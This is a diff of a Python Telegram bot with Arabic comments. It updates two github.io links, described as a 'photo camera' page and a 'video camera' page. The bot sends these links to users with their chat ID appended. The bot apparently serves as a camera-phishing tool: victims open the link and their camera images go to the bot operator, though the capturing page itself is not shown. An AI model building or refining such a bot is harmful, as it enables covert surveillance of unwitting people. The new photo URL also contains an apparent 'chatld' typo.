@@ -18,9 +18,9 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # مسار قاعدة بيانات الأصوات الآمن على Railway
 DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"
 
-# تنظيف وتعديل الروابط الأساسية لتكون قابلة للنقر مباشرة وبدون أخطاء
-PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
-VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
+# الروابط المنفصلة والصحيحة تماماً الآن
+PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"  # الرابط الجديد الخاص بالكاميرا
+VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"     # رابط الفيديو الأصلي
 
 user_states = {}
 user_data = {}
@@ -94,13 +94,13 @@ def handle_query(call):
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_photo_link":
-        # صياغة الرابط بشكل مباشر بدون رموز تالفة ليكون أزرق وقابل للضغط فوراً
+        # إرسال رابط الكاميرا الجديد مضافاً إليه chatId ليعمل بالضغط المباشر
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🖼️ **رابط كاميرا الصور الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_video_link":
-        # صياغة الرابط بشكل مباشر بدون رموز تالفة ليكون أزرق وقابل للضغط فوراً
+        # إرسال رابط الفيديو الأصلي مضافاً إليه chatId ليعمل بالضغط المباشر
         link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🎥 **رابط كاميرا الفيديو الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
         bot.answer_callback_query(call.id)
@@ -186,5 +186,5 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"تنبيه تهيئة: {e}")
 
-    print("🚀 البوت جاهز والروابط الآن زرقاء ونظيفة تماماً وقابلة للنقر الفوري...")
+    print("🚀 تم تحديث وفصل الروابط بنجاح، البوت يعمل الآن بكفاءة...")
     bot.polling(none_stop=True, interval=0, timeout=50)
